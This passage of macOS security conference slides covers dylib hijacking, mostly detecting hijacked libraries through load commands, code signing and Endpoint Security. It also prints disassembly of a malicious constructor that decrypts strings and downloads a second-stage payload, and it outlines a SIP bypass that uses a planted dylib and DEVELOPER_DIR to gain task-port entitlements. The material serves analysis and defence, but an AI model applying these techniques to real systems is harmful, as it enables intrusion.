**`"__mod_init_func"`**

**`(Intel x86_64)`**

\```
01 EntryPoint:
02  xor        eax, eax
03  jmp        run_avcodec
04  ...
06 run_avcodec:
07  push       rax
08  movabs     rax, 0xaaaaaaaaaaaaaaaa
09  mov        rdi, rsp
10  mov        qword [rdi], rax
11  lea        rdx, qword [0x48430]
12  xor        esi, esi
13  xor        ecx, ecx
14  call       pthread_create
15  pop        rax
16  ret
\```

**`The arm64 version, has no constructor,`**
**`nor apparent malicious subversions (and thus was pristine).`**

## Slide 48

### **`The thread function`**

**`large, suspicious, and contained the malicious logic`**

\```
01 int sub_48430() {
02     rsp = rsp - 0x2400;
03     rax = getenv("HOME");
04     if (rax == 0x0) goto loc_48965;
06     ... 600 more lines!
\```

600+ lines disassembled !

\```
01 do {
02     *(rsp + rax + 0x1b40) = *(rsp + rax + 0x1b40) ^ 0x7a;
03     rax = rax + 0x1;
04 } while (rax != 0x32);
\```

...including xor decryption

**`downloads`**
**`2nd-stage payload`**

## Slide 49

### **`A Dylib Exploit`**

**`SIP bypass (credit: @CodeColorist)`**

CoreSymbolication attempted
to load "libswiftDemangle.dylib":

\```
01 (allow default)
02 (deny file-read*
03     (literal "/usr/lib/libswiftDemangle.dylib")
\```

1. **`/usr/lib/`**

2. **`${xcselect_get_developer_dir_path()} /Toolchains/XcodeDefault.xctoolchain/usr/lib/`**

**`xcselect_get_developer_dir_path`** uses **`DEVELOPER_DIR`** environment variable

\```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC ...>
<plist version="1.0">
...
<key>com.apple.system-task-ports</key>
<true/>
\```

**`entitled Apple binaries`**
**`that load CoreSymbolication`**

**`"libswiftDemangle.dylib"`**

**`attacker inherits`**
**`"com.apple.system-task-ports"`**

## Slide 50

## Detect hijackers, malware, & more, by: **`Enumerating Dylibs`**

## Slide 51

### **`Load Commands`**

**`instructions to the loader`**

\```
Mach-O Header
Load Commands
Data
\```

\```
01 struct load_command {
02   uint32_t cmd;
03   uint32_t cmdsize;
04 };
\```

**`type: struct 'load_command'`**

\```
RAW    RVA

▼ Executable  (X86_64) [SDK10.6]
    Mach64 Header
  ▼ Load Commands
      LC_SEGMENT_64 (__PAGEZERO)
    ▶ LC_SEGMENT_64 (__TEXT)
    ▶ LC_SEGMENT_64 (__DATA)
      LC_SEGMENT_64 (__LINKEDIT)
      LC_DYLD_INFO_ONLY
      LC_SYMTAB
      LC_DYSYMTAB
      LC_LOAD_DYLINKER
      LC_UUID
      LC_VERSION_MIN_MACOSX
      LC_UNIXTHREAD
      LC_LOAD_DYLIB (libcrypto.0.9.8.dylib)
      LC_LOAD_DYLIB (Cocoa)
      LC_LOAD_DYLIB (Foundation)
      LC_LOAD_DYLIB (libobjc.A.dylib)
      LC_LOAD_DYLIB (libstdc++.6.dylib)
      LC_LOAD_DYLIB (libSystem.B.dylib)
      LC_LOAD_DYLIB (AppKit)
\```

| Offset | Data | Description | Value |
| --- | --- | --- | --- |
| 00000020 | 00000019 | Command | LC_SEGMENT_64 |
| 00000024 | 00000048 | Command Size | 72 |
| 00000028 | 5F5F50414… | Segment Name | __PAGEZERO |
| 00000038 | 000000000… | VM Address | 0 |
| 00000040 | 000000010… | VM Size | 4294967296 |
| 00000048 | 000000000… | File Offset | 0 |
| 00000050 | 000000000… | File Size | 0 |
| 00000058 | 00000000 | Maximum VM Protection |  |
|  | 00000000 |  | VM_PROT_NONE |
| 0000005C | 00000000 | Initial VM Protection |  |
|  | 00000000 |  | VM_PROT_NONE |
| 00000060 | 00000000 | Number of Sections | 0 |
| 00000064 | 00000000 | Flags |  |

**`load commands`**
**`("MachOView" app)`**

includes dependencies (dylibs)

**`Load Commands:`**
**`a "table of contents" for the loader (dyld),`**
**`describing the rest of the binary (segments, dylibs, etc.)`**

## Slide 52

### **`LC_LOAD_DYLIB Load Commands`**

**`tells dyld (loader) what libraries the binary requires`**

\```
% otool -L /System/Applications/Calculator.app/Contents/MacOS/Calculator
/usr/lib/libobjc.A.dylib
/System/Library/PrivateFrameworks/Calculate.framework/Versions/A/Calculate
/System/Library/PrivateFrameworks/CalculateUI.framework/Versions/A/CalculateUI
....
\```

view via **`otool -L / -l`**

**`each dependency described via a`**
**`'LC_LOAD_DYLIB' load command`**

\```
% otool -l /System/Applications/Calculator.app/Contents/MacOS/Calculator
...
Load command 17
          cmd LC_LOAD_DYLIB
      cmdsize 56
         name /usr/lib/libobjc.A.dylib (offset 24)
compatibility version 1.0.0
\```

**`To programmatically extract dependencies:`**

1. **`Parse Mach-O header & Load Commands`**

2. **`For each LC_LOAD_DYLIB extract library path`**

**`scan, etc…`**

## Slide 53

### **`Detect Dylib Hijackers (Statically)`**

**`multiple (run-path) dylibs w/ same name in different dirs.`**

1. **`list of run path directories (load command: LC_RPATH)`**

2. **`LC_LOAD_DYLIBs`**

**`@rpath/<some>.dylib`**

esp. if dylib code signing doesn't match !

**`If you encounter multiple instances of a "run-path" dylib (in multiple run-path directories), the app may be hijacked!`**

## Slide 54

### **`Detect Dylib Hijackers (Statically)`**

**`multiple (run-path) dylibs w/ same name in different dirs.`**

\```
01 //iterate overall all dependencies
02 for(NSString* dependency in binary.parserInstance.binaryInfo[KEY_LC_LOAD_DYLIBS]) {
04    int dylibCount = 0;
06    //skip non-rpath'd dependencies
07    if(![dependency hasPrefix:@"@rpath"]) {
08       continue;
09    }
11    //check all run path directories
12    for(NSString* runPath in binary.parserInstance.binaryInfo[KEY_LC_RPATHS]) {
14       //build full path
15       path = [runPath stringByAppendingPathComponent:dependency substringFromIndex:"@rpath".length]];
17       //does it exist?
18       if([NSFileManager.defaultManager fileExistsAtPath:path]){
19          dylibCount++;
20       }
22       //more than one dylib w/ same name?
23       if(dylibCount == 2) {
24          //potential hijack!
25       }
26       ...
\```

**`Hijacked Applications`**

\```
/Applications/Adobe Photoshop 2025/Adobe Photoshop 2025.app/Contents/MacOS/Adobe Photoshop 2025
rpath hijacker: /Applications/Adobe Photoshop 2025/Adobe Photoshop 2025.app/Contents/MacOS/libtbb.12.6.dylib
\```

## Slide 55

### **`Detect Dylib Hijackers (Statically)`**

**`verify code-signing of entire bundle?`**

though very slow :\

\```
01 //create static code ref via path
02 status = SecStaticCodeCreateWithPath((__bridge CFURLRef)([NSURL fileURLWithPath:path]), kSecCSDefaultFlags, &code);
03 if(errSecSuccess != status) {
04    //handle error
05 }
07 //check signature (validates entire bundle: code, nested code, etc.)
08 SecCSFlags flags = kSecCSCheckNestedCode | kSecCSCheckAllArchitectures | kSecCSStrictValidate;
09 status = SecStaticCodeCheckValidity(code, flags, NULL);
10 if(errSecSuccess != status) {
11    //handle error
12 }
14 //extract signing info
15 status = SecCodeCopySigningInformation(code, kSecCSSigningInformation, &signingDetails);
16 if(errSecSuccess != status) {
17    //handle error
18 }
\```

**`code signing verification / extraction`**

...if macOS was doing it's job,
we wouldn't be in this conundrum!

**`Photoshop 2025 has a signing issue`**

\```
Photoshop 2025
/Applications/Adobe Photoshop 2025/Adobe Photoshop 2025.app

      Type: Application
    Hashes: View Hashes
  Entitled: None
Sign Auths: Unknown (status/error: -67054)
\```

**`hijacked Photoshop`**
**`...invalidly signed!`**

## Slide 56

### **`Runtime Extraction of Loaded Dylibs`**

**`via proc_pidinfo with pid and 'PROC_PIDREGIONPATHINFO'`**

1. **`In a loop, invoke proc_pidinfo with a process ID and 'PROC_PIDREGIONPATHINFO'`**

2. **`For executable regions, extract their path`**

\```
01 while(PROC_PIDREGIONPATHINFO_SIZE ==
02     (proc_pidinfo(pid, PROC_PIDREGIONPATHINFO, addr, &region, PROC_PIDREGIONPATHINFO_SIZE))) {
04    if(region.prp_prinfo.pri_protection & VM_PROT_EXECUTE) {
05       //extract path from : region.prp_vip.vip_path
06    }
08    addr = region.prp_prinfo.pri_address + region.prp_prinfo.pri_size;
09 }
\```

dylib paths

...no entitlements needed! 🥳

## Slide 57

### **`Runtime Detection of Hijackers`**

**`…via name dylib "collisions" + code signing checks`**

1. **`Enumerate loaded libraries`**

2. **`Identify library name "collisions"`**

3. **`Eliminate false positives by checking code signing formation`**

\```
% ./enumDylibs $(pgrep Photoshop)

Process:         Adobe Photoshop 2026 [14792]
Path:            /Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026
Code Type:       ARM64

Dylibs:

/Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/Frameworks/AID.dylib
…
/Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/MacOS/libtbb.12.6.dylib
…
/Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/Frameworks/libtbb.12.6.dylib
\```

2x **`libtbb.12.6.dylib`**

**`Photoshop: dylib hijacked`**

## Slide 58

### **`Load-time Detection of Dylibs`**

**`via Endpoint Security (ES) events`**

1. **`Register for ES_EVENT_TYPE_NOTIFY/AUTH_MMAP events`**

2. **`For executable mappings, extract their path`**

\```
01 //in endpoint security callback block
03 es_event_mmap_t *mmap = &message->event.mmap;
05 if(mmap->protection & VM_PROT_EXECUTE)) {
06    //extract path from: mmap->source->path
07 }
\```

dylib paths!

\```
# ./dylibMonitor $(pgrep Photoshop)

Process:         Adobe Photoshop 2026 [14792]
Path:            /Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/MacOS/Adobe Photoshop 2026
Code Type:       ARM64

New ES event: ES_EVENT_TYPE_AUTH_MMAP (Permission: VM_PROT_EXECUTE)
Mapping Path: /Applications/Adobe Photoshop 2026/Adobe Photoshop 2026.app/Contents/MacOS/libtbb.12.6.dylib

Team ID mismatch, will deny!
\```

blocked!

## Slide 59

## **`Conclusions`**

## Slide 60

### **`So is Dylib Hijacking Dead?`**

....it's down, but not out!

**`Apple, please fix:`**

1. **`App Translocation`**

...why not just translocate any downloaded binary?

2. **`App Validation`**

...why is this broken?

## Slide 61

### **`And remember, scan those dylibs!`**

**`Detect malware, hijackers, exploits and more`**

**`Creating`** 🍎 **`-malware?`**
**`Implement it as a dylib!`**

hacker's and defenders:
...let's stop ignoring dylibs !!

## Slide 62

### **`Inviting You To "Objective by the Sea"`**

the only Apple-specific security conference

#OBTS v9 November, Hawaii

**`objectivebythesea.org`**

## Slide 63

### **`Mahalo to the "Friends of Objective-See"`**

- iru
- paloalto NETWORKS
- jamf
- moonlock by MacPaw
- SOPHOS
- Malwarebytes™
- HUNTRESS
- RIPPLING
- iVerify.

## Slide 64

### **`Dead or Alive`**

**`dylib hijacking on macOS`**

**`RESOURCES:`**

\```
"Dylib hijacking on OS X"
www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x

"Tweaking macOS security controls to thwart application bundle manipulation"
redcanary.com/blog/threat-detection/mac-application-bundles/

"What's New in Security" (WWDC 2016)
devstreaming-cdn.apple.com/videos/wwdc/2016/706sgjvzkvg6rrg9icw/706/706_whats_new_in_security.pdf
\```

